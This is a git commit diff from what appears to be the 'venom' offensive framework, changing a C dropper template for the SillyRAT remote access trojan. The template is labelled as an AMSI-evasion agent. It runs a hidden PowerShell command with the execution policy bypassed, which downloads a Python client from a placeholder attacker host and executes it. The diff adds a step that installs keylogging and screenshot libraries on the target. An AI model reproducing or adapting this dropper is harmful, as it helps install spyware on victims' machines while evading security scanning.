d8c47fbe3d0347ce1d172b5cf446ae8bccbb41f8
root <root@localhost.localdomain>
2020-08-31 02:08:14 +0100

    venom v1.0.17 - SillyRAT (Install Client pip dependencies on target)

--- templates/sillyme.c
+++ templates/sillyme.c
@@ -2,6 +2,7 @@
 Author: r00t-3xp10it [SSA RedTeam @2020]
 Framework: Venom v1.0.17 - Amsi Evasion Agent nº 6
 This template its used to download/exec (Client.py) from attacker machine (LAN)
+Mandatory dependencies: python3 and pip {tabulate pynput psutil pillow pyscreenshot pyinstaller}
 */
 
 #include<stdio.h>
@@ -11,6 +12,8 @@ This template its used to download/exec (Client.py) from attacker machine (LAN)
 
 int main()
 {
- system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.py', 'TempDir\\FiLNaMe.py') && cd TempDir && python3 FiLNaMe.py");
+ /* The next line will install SillyRAT requirements if found python 3 Then Downloads/Executes the Client.py */
+ system("$pyVersion = python --version|Select-String \"3.\";If($pyVersion){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}");
+ system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.py', 'TempDir\\FiLNaMe.py') && cd TempDir && python FiLNaMe.py");
  return 0;
 }
